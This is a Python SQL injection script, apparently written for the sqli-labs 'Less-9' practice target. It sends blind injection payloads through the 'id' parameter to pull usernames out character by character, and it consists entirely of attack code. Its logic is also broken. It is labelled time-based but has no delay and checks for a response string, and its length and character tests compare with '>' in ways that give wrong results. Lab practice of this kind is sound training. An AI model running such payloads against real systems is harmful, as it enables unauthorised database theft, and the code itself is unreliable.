import requests

# 目标URL
url = "http://10.63.24.160:8080/Less-9/"
# 要注入的参数名
param_name = "id"

# 数据库信息
db_info = {
    "table": "users",
    "column": "username"
}

# 检查字符函数
def check_char(char, position):
    payload = f"1' AND ascii(SUBSTRING({db_info['column']}, {position}, 1)) > ascii('{char}') -- "
    params = {param_name: payload}
    response = requests.get(url, params=params)
    return "Server response time is longer than expected" in str(response.content)

# 获取字符串长度
def get_string_length():
    length = 0
    while True:
        if check_char('a', length + 1):
            length += 1
        else:
            break
    return length

# 获取字符串内容
def get_string_content(length):
    result = ""
    for i in range(1, length + 1):
        char_found = False
        for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
            if check_char(char, i):
                result += char
                char_found = True
                break
        if not char_found:
            result += "?"
    return result

# 执行时间盲注
def time_based_injection():
    length = get_string_length()
    print(f"Length of the string: {length}")

    content = get_string_content(length)
    print(f"Content of the string: {content}")

if __name__ == "__main__":
    time_based_injection()
